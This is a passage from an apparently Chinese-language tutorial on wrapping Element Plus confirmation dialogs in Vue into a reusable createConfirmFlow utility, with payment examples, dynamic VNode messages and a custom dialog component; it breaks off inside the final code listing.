<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">validate</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
};

<span class="hljs-keyword">const</span> handlePayment = <span class="hljs-title function_">createConfirmFlow</span>(
  <span class="hljs-keyword">async</span> (row) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"发起支付"</span>, row);
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">api</span>();
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"支付成功"</span>);
  },
  {
    <span class="hljs-attr">title</span>: <span class="hljs-string">"支付提示"</span>,
    <span class="hljs-attr">message</span>: <span class="hljs-string">`总价为 ￥188 是否确认支付？`</span>,
    <span class="hljs-attr">beforeClose</span>: <span class="hljs-keyword">async</span> (action, instance, done) =&gt; {
      <span class="hljs-keyword">if</span> (action === <span class="hljs-string">"confirm"</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"先干点别的"</span>);
        instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">true</span>;
        instance.<span class="hljs-property">confirmButtonText</span> = <span class="hljs-string">"支付中..."</span>;
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">3000</span>);

        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">validate</span>()) {
          <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"验证失败，无法支付"</span>);
          instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">false</span>;
          instance.<span class="hljs-property">confirmButtonText</span> = <span class="hljs-string">"OK"</span>;
          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"验证失败"</span>);
        }
      }

      <span class="hljs-title function_">done</span>();
    },
  }
);
</code></pre>
<blockquote>
<p>这样就达到我想要的效果了</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0c8f2f3d01e40089c38c638285f82d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW5DQmxl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764518510&amp;x-signature=QTDZbcrE1B1Crbc%2FjIYNCwO9sbQ%3D" alt="动画.gif" loading="lazy"/></p>
<h4 data-id="heading-7">动态的 message</h4>
<p>还是支付为例，获取订单中的商品数量跟价格，计算后赋值给 <strong>message</strong> 后再创建流程处理函数打开弹窗。</p>
<pre><code class="hljs language-typescript" lang="typescript">
<span class="hljs-comment">// row =&gt; { id: 2, name: "李四", quantity: 10, unitPrice: 88.0, ...... }</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePayment</span> = (<span class="hljs-params">row: User</span>) =&gt; {
  <span class="hljs-keyword">const</span> execute = <span class="hljs-title function_">createConfirmFlow</span>(
    <span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"发起支付"</span>, row.<span class="hljs-property">quantity</span> * row.<span class="hljs-property">unitPrice</span>);
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">api</span>();
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"支付成功"</span>);
    },
    {
      <span class="hljs-attr">title</span>: <span class="hljs-string">"支付提示"</span>,
      <span class="hljs-attr">message</span>: <span class="hljs-string">`总价为 ￥<span class="hljs-subst">${row.quantity * row.unitPrice}</span> 是否确认支付？`</span>,
      <span class="hljs-attr">beforeClose</span>: <span class="hljs-keyword">async</span> (action, instance, done) =&gt; {
        <span class="hljs-keyword">if</span> (action === <span class="hljs-string">"confirm"</span>) {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"先干点别的"</span>);
          instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">true</span>;
          instance.<span class="hljs-property">confirmButtonText</span> = <span class="hljs-string">"支付中..."</span>;
          <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">3000</span>);

          <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &lt; <span class="hljs-number">0.5</span>) {
            <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"验证失败，无法支付"</span>);
            instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">false</span>;
            instance.<span class="hljs-property">confirmButtonText</span> = <span class="hljs-string">"OK"</span>;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"验证失败"</span>);
          }
        }

        <span class="hljs-title function_">done</span>();
      },
    }
  );

  <span class="hljs-title function_">execute</span>();
};

</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ab4f1b9fa514e0d88be463fbbab515f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW5DQmxl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764518510&amp;x-signature=ZulrNgDBG1YOmiNBbs8MiiDQVcg%3D" alt="动画.gif" loading="lazy"/></p>
<h4 data-id="heading-8">自定义 message</h4>
<p>自定义 <strong>message</strong> 实际上跟 <strong>ElMessageBox</strong> 一样，给 <strong>message</strong> 参数传入一个 <strong>VNode</strong> 即可。还是以上面支付的例子扩展一下。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { h } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePayment</span> = (<span class="hljs-params">row: User</span>) =&gt; {
 <span class="hljs-comment">// + 使用 h 创建一个 VNode</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">MessageVNode</span> = <span class="hljs-title function_">h</span>(<span class="hljs-string">"p"</span>, [
    <span class="hljs-string">"总价为"</span>,
    <span class="hljs-title function_">h</span>(
      <span class="hljs-string">"strong"</span>,
      { <span class="hljs-attr">style</span>: <span class="hljs-string">"color: red;"</span> },
      <span class="hljs-string">` ￥<span class="hljs-subst">${row.quantity * row.unitPrice}</span> `</span>
    ),
    <span class="hljs-string">"是否确认支付？"</span>,
  ]);

  <span class="hljs-keyword">const</span> execute = <span class="hljs-title function_">createConfirmFlow</span>(
    <span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"发起支付"</span>, row.<span class="hljs-property">quantity</span> * row.<span class="hljs-property">unitPrice</span>);
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">api</span>();
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"支付成功"</span>);
    },
    {
      <span class="hljs-attr">title</span>: <span class="hljs-string">"支付提示"</span>,
      <span class="hljs-attr">message</span>: <span class="hljs-title class_">MessageVNode</span>, <span class="hljs-comment">// 将创建的 VNode 传给 message</span>
      <span class="hljs-attr">beforeClose</span>: <span class="hljs-keyword">async</span> (action, instance, done) =&gt; {
        <span class="hljs-keyword">if</span> (action === <span class="hljs-string">"confirm"</span>) {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"先干点别的"</span>);
          instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">true</span>;
          instance.<span class="hljs-property">confirmButtonText</span> = <span class="hljs-string">"支付中..."</span>;
          <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">3000</span>);

          <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &lt; <span class="hljs-number">0.5</span>) {
            <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"验证失败，无法支付"</span>);
            instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">false</span>;
            instance.<span class="hljs-property">confirmButtonText</span> = <span class="hljs-string">"OK"</span>;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"验证失败"</span>);
          }
        }

        <span class="hljs-title function_">done</span>();
      },
    }
  );

  <span class="hljs-title function_">execute</span>();
};

</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cbabd133fc1549c380589a922d91c502~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW5DQmxl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764518510&amp;x-signature=wH9pE3kfOxr9hxPveTddUFKJUWU%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-9">自定义确认组件</h4>
<p>在实际开发中，可能确认流程内部封装的组件不一定适用所有业务需要，也许在同样的流程中，会有不同的 <strong>UI</strong> 展示效果，也许需要使用自定义的确认组件。所以为了我们封装的这个流程复用工具函数能够支持自定义的 <strong>UI</strong> 组件，我需要对他做以下扩展。</p>
<blockquote>
<p>需要能扩展自定义组件的功能之前，需要抽象一些公共部分，并且约束自定义组件必须具备的特性，交给我们封装好的函数使用。</p>
</blockquote>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. 声明自定义组件必须具备的特性</span>
<span class="hljs-comment">// Message 参考 ElMessagebox 的类型</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">Message</span> = <span class="hljs-built_in">string</span> | <span class="hljs-title class_">VNode</span> | (<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">VNode</span>);
<span class="hljs-keyword">type</span> <span class="hljs-title class_">CallBack</span> = <span class="hljs-function">(<span class="hljs-params">...args: <span class="hljs-built_in">any</span>[]</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; | <span class="hljs-built_in">void</span>;

<span class="hljs-comment">// 声明配置类型，继承 ElMessageBoxOptions 的类型作为基本配置，并扩展我们自己的必须的类型</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ConfirmFlowOptions</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ElMessageBoxOptions</span> {
  message?: <span class="hljs-title class_">Message</span>;
  title?: <span class="hljs-built_in">string</span>;
  <span class="hljs-title class_">CustomComponent</span>?: <span class="hljs-title class_">CustomConfirmMessage</span> | <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;;
  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;
}

<span class="hljs-comment">// 这个是自定义组件的类型标注，必须要实现 confirm 函数</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">CustomConfirmMessage</span> {
  <span class="hljs-attr">confirm</span>: <span class="hljs-function">(<span class="hljs-params">
    message: ElMessageBoxOptions[<span class="hljs-string">"message"</span>],
    options?: ConfirmFlowOptions
  </span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt;;
}

<span class="hljs-comment">// 辅助校验自定义组件是否存在 confirm 函数</span>
<span class="hljs-keyword">const</span> isConfirmMessage = (<span class="hljs-attr">obj</span>: <span class="hljs-built_in">unknown</span>): obj is <span class="hljs-title class_">CustomConfirmMessage</span> =&gt;
  <span class="hljs-title function_">isObject</span>(obj) &amp;&amp; !<span class="hljs-title function_">isNull</span>(obj) &amp;&amp; <span class="hljs-string">"confirm"</span> <span class="hljs-keyword">in</span> obj &amp;&amp; <span class="hljs-title function_">isFunction</span>(obj.<span class="hljs-property">confirm</span>);

<span class="hljs-comment">// 获取自定义组件构造器，核心目的也是为了调用 confirm </span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">getMessageConstructor</span> = (<span class="hljs-params">options: ConfirmFlowOptions = {}</span>) =&gt; {
  <span class="hljs-keyword">const</span> { <span class="hljs-title class_">CustomComponent</span> } = options;

  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isConfirmMessage</span>(<span class="hljs-title class_">CustomComponent</span>)) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">CustomComponent</span>;
  }

  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ElMessageBox</span>;
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">createConfirmFlow</span> = (<span class="hljs-params">
  callback: CallBack,
  options?: ConfirmFlowOptions
</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">async</span> (...<span class="hljs-attr">args</span>: <span class="hljs-title class_">Parameters</span>&lt;<span class="hljs-title class_">CallBack</span>&gt;) =&gt; {
    <span class="hljs-comment">// + 获取流程确认组件</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title class_">ConfirmMessage</span> = <span class="hljs-title function_">getMessageConstructor</span>(options);

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title class_">ConfirmMessage</span>.<span class="hljs-title function_">confirm</span>(options?.<span class="hljs-property">message</span>, options);
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">callback</span>(...args);
      <span class="hljs-comment">// 修改状态...</span>
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-keyword">if</span> (error === <span class="hljs-string">"cancel"</span>) <span class="hljs-keyword">return</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);
    }
  };
};

</code></pre>
<blockquote>
<p>上述代码描述了自定义组件必须具备的函数，并且统一了添加了 <strong>getMessageConstructor</strong> 函数来获取消息组件。可以是自定义的，也可以是默认的 <strong>ElMessageBox</strong></p>
</blockquote>
<ul>
<li>下面我写一个基本的自定义弹窗确认组件来演示这个自定义 <strong>ui</strong> 组件的功能是否正常</li>
</ul>
<ol>
<li>先创建一个 <strong>CustomConfirmDialog.vue</strong>组件</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript">&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-dialog</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"visible"</span> <span class="hljs-attr">:title</span>=<span class="hljs-string">"title"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"40%"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{{ message }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">footer</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"cancel"</span>&gt;</span>取消<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">:loading</span>=<span class="hljs-string">"loading"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"confirm"</span>&gt;</span>
        {{ confirmText || "确定" }}
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">el-dialog</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { getCurrentInstance, ref } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>;
<span class="hljs-keyword">import</span> type { <span class="hljs-title class_">Action</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"./customConfirmDialog"</span>;

<span class="hljs-keyword">const</span> props = defineProps&lt;{
  title?: string;
  message?: string;
  confirmText?: string;
  beforeClose?: <span class="hljs-title class_">Function</span>;
}&gt;();

<span class="hljs-keyword">const</span> emit = defineEmits&lt;{
  (<span class="hljs-attr">e</span>: <span class="hljs-string">"action"</span>, <span class="hljs-attr">action</span>: <span class="hljs-title class_">Action</span>): <span class="hljs-keyword">void</span>;
}&gt;();

<span class="hljs-keyword">const</span> root = <span class="hljs-title function_">getCurrentInstance</span>();

<span class="hljs-keyword">const</span> visible = <span class="hljs-title function_">defineModel</span>({ <span class="hljs-attr">default</span>: <span class="hljs-literal">false</span> });
<span class="hljs-keyword">const</span> loading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>);

<span class="hljs-keyword">const</span> <span class="hljs-title function_">confirm</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">await</span> props.<span class="hljs-property">beforeClose</span>?.(<span class="hljs-string">"confirm"</span>, root?.<span class="hljs-property">exposed</span> || {}, <span class="hljs-function">() =&gt;</span> {
    visible.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
  });
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">"action"</span>, <span class="hljs-string">"confirm"</span>);
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">cancel</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">await</span> props.<span class="hljs-property">beforeClose</span>?.(<span class="hljs-string">"cancel"</span>, root?.<span class="hljs-property">exposed</span> || {}, <span class="hljs-function">() =&gt;</span> {
    visible.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
  });
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">"action"</span>, <span class="hljs-string">"cancel"</span>);
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">open</span> = (<span class="hljs-params"/>) =&gt; {
  visible.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">close</span> = (<span class="hljs-params"/>) =&gt; {
  visible.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
};

<span class="hljs-title function_">defineExpose</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(
    {
      open,
      close,
      <span class="hljs-attr">confirmButtonLoading</span>: loading.<span class="hljs-property">value</span>,
    },
    {
      <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">target, key, receiver</span>) =&gt;</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver);
      },
      <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">target, key, value, receiver</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, key, value, receiver);
        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">"confirmButtonLoading"</span>) {
          loading.<span class="hljs-property">value</span> = value;
        }

        <span class="hljs-keyword">return</span> result;
      },
    }
  )
);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>

</code></pre>
<ol start="2">
<li>添加一个 <strong>customConfirmDialog.ts</strong> 将弹窗组件按命令式弹窗的方式使用 <strong>confirm</strong> 来创建。</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">CustomConfirmDialogConstructor</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./CustomConfirmDialog.vue"</span>;

<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">ConfirmFlowOptions</span>, <span class="hljs-title class_">CustomConfirmMessage</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/utils"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">ElMessageBoxOptions</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"element-plus"</span>;
<span class="hljs-keyword">import</span> {
  createVNode,
  render,
  <span class="hljs-keyword">type</span> <span class="hljs-title class_">AppContext</span>,
  <span class="hljs-keyword">type</span> <span class="hljs-title class_">ComponentInternalInstance</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">Action</span> = <span class="hljs-string">"confirm"</span> | <span class="hljs-string">"cancel"</span>;

<span class="hljs-keyword">const</span> instanceMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;
  <span class="hljs-title class_">ComponentInternalInstance</span>,
  {
    <span class="hljs-attr">options</span>: <span class="hljs-built_in">any</span>;
    <span class="hljs-attr">resolve</span>: <span class="hljs-function">(<span class="hljs-params">res: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;
    <span class="hljs-attr">reject</span>: <span class="hljs-function">(<span class="hljs-params">reason?: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;
  }
&gt;();

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomConfirmDialog</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CustomConfirmMessage</span> {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">confirm</span>(<span class="hljs-params">
    message: ElMessageBoxOptions[<span class="hljs-string">"message"</span>],
    options?: ConfirmFlowOptions,
    appContext?: AppContext
  </span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> instance = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createInstance</span>({ message, ...options }, appContext);

      instanceMap.<span class="hljs-title function_">set</span>(instance, { options, resolve, reject });
    });
  }

  <span class="hljs-title function_">createInstance</span>(<span class="hljs-params">options: ConfirmFlowOptions, appContext?: AppContext</span>) {
    <span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"div"</span>);

    <span class="hljs-keyword">const</span> instance = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">initInstance</span>(options, container, appContext)!;
    instance.<span class="hljs-property">exposed</span>?.<span class="hljs-title function_">open</span>();

    <span class="hljs-keyword">return</span> instance;
  }

  <span class="hljs-title function_">initInstance</span>(<span class="hljs-params">
    props: <span class="hljs-built_in">any</span>,
    container: HTMLElement,
    appContext: AppContext | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>
  </span>) {
    <span class="hljs-keyword">const</span> vnode = <span class="hljs-title function_">createVNode</span>(<span class="hljs-title class_">CustomConfirmDialogConstructor</span>, props);

    vnode.<span class="hljs-property">appContext</span> = appContext;

    <span class="hljs-title function_">render</span>(vnode, container);

    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(container.<span class="hljs-property">firstElementChild</span>!);

    <span class="hljs-keyword">return</span> vnode.<span class="hljs-property">component</span>;
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomConfirmDialog</span>();

</code></pre>
<ol start="3">
<li>页面使用验证功能是否正常</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">CustomConfirmDialog</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"./CustomConfirmDialog"</span>;
<span class="hljs-keyword">import</span> { createConfirmFlow } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/utils/business"</span>;

<span class="hljs-comment">// 自定义确认组件</span>
<span class="hljs-keyword">const</span> handleSensitiveOp = <span class="hljs-title function_">createConfirmFlow</span>(
  <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">api</span>();
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"操作成功"</span>);
  },
  {
    <span class="hljs-title class_">CustomComponent</span>: <span class="hljs-title class_">CustomConfirmDialog</span>,
    <span class="hljs-attr">message</span>: <span class="hljs-string">"此操作包含敏感数据修改，是否继续？"</span>,
    <span class="hljs-attr">title</span>: <span class="hljs-string">"敏感操作确认"</span>,
    <span class="hljs-attr">beforeClose</span>: <span class="hljs-keyword">async</span> (action, instance, done) =&gt; {
      <span class="hljs-keyword">if</span> (action === <span class="hljs-string">"confirm"</span>) {
        instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">2000</span>); <span class="hljs-comment">// 模拟异步操作</span>
        instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">false</span>;
      }
      <span class="hljs-title function_">done</span>();
    },
  }
);

</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13a534c3c04648bf94abc72a955125f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW5DQmxl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764518510&amp;x-signature=s8uBCXSHnR6%2FJoXt0O9J%2B5R6R5A%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>完全没有问题。至此也就完成了这样一个流程复用的工具函数。</p>
</blockquote>
<h2 data-id="heading-10">confirmFlow 函数完整代码</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">ElMessageBox</span>, <span class="hljs-keyword">type</span> <span class="hljs-title class_">ElMessageBoxOptions</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"element-plus"</span>;
<span class="hljs-keyword">import</span> { isFunction, isNull, isObject } <span class="hljs-keyword">from</span> <span class="hljs-string">"lodash-es"</span>;

<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">VNode</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">Message</span> = <span class="hljs-built_in">string</span> | <span class="hljs-title class_">VNode</span> | (<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">VNode</span>);
<span class="hljs-keyword">type</span> <span class="hljs-title class_">CallBack</span> = <span class="hljs-function">(<span class="hljs-params">...args: <span class="hljs-built_in">any</span>[]</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; | <span class="hljs-built_in">void</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ConfirmFlowOptions</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ElMessageBoxOptions</span> {
  message?: <span class="hljs-title class_">Message</span>;
  title?: <span class="hljs-built_in">string</span>;
  <span class="hljs-title class_">CustomComponent</span>?: <span class="hljs-title class_">CustomConfirmMessage</span> | <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;;
  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">CustomConfirmMessage</span> {
  <span class="hljs-attr">confirm</span>: <span class="hljs-function">(<span class="hljs-params">
    message: ElMessageBoxOptions[<span class="hljs-string">"message"</span>],
    options?: ConfirmFlowOptions
  </span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt;;
}

<span class="hljs-keyword">const</span> isConfirmMessage = (<span class="hljs-attr">obj</span>: <span class="hljs-built_in">unknown</span>): obj is <span class="hljs-title class_">CustomConfirmMessage</span> =&gt;
  <span class="hljs-title function_">isObject</span>(obj) &amp;&amp; !<span class="hljs-title function_">isNull</span>(obj) &amp;&amp; <span class="hljs-string">"confirm"</span> <span class="hljs-keyword">in</span> obj &amp;&amp; <span class="hljs-title function_">isFunction</span>(obj.<span class="hljs-property">confirm</span>);

<span class="hljs-keyword">const</span> <span class="hljs-title function_">getMessageConstructor</span> = (<span class="hljs-params">options: ConfirmFlowOptions = {}</span>) =&gt; {
  <span class="hljs-keyword">const</span> { <span class="hljs-title class_">CustomComponent</span> } = options;

  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isConfirmMessage</span>(<span class="hljs-title class_">CustomComponent</span>)) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">CustomComponent</span>;
  }

  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ElMessageBox</span>;
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">createConfirmFlow</span> = (<span class="hljs-params">
  callback: CallBack,
  options?: ConfirmFlowOptions
</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">async</span> (...<span class="hljs-attr">args</span>: <span class="hljs-title class_">Parameters</span>&lt;<span class="hljs-title class_">CallBack</span>&gt;) =&gt; {
    <span class="hljs-keyword">const</span> <span class="hljs-title class_">ConfirmMessage</span> = <span class="hljs-title function_">getMessageConstructor</span>(options);

    <span class="hljs-keyword">try</span> {
